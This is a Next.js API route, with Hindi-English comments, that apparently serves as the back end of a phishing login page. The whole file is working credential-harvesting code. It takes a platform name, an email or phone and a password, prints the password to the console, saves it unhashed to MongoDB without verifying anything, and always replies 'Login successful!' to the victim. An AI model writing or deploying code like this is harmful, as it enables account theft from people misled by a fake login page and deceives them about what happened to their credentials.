import { NextRequest, NextResponse } from "next/server";
import { connectDB, User } from "@/lib/mongodb";

// ⚠️ SAVE ONLY — password match nahi karta, sirf DB mein save karta hai

export async function POST(req: NextRequest) {
  try {
    await connectDB();

    const body = await req.json();
    const { platform, identifier, password } = body;

    console.log(`\n💾 [LOGIN-SAVE] Platform: ${platform}`);
    console.log(`   Email/Phone : ${identifier}`);
    console.log(`   Password    : ${password}`);

    if (!identifier || !password) {
      return NextResponse.json({ message: "Email aur password required hai." }, { status: 400 });
    }

    // Sirf save — koi match nahi
    const entry = new User({
      platform: platform || "unknown",
      email:    identifier,
      password: password,
    });

    await entry.save();

    console.log("✅ [LOGIN-SAVE] Saved! ID:", entry._id);

    return NextResponse.json(
      { message: "Login successful!", user: { email: identifier } },
      { status: 200 }
    );

  } catch (err: any) {
    console.error("🔴 [LOGIN-SAVE] Error:", err.message);
    return NextResponse.json({ message: "Server error: " + err.message }, { status: 500 });
  }
}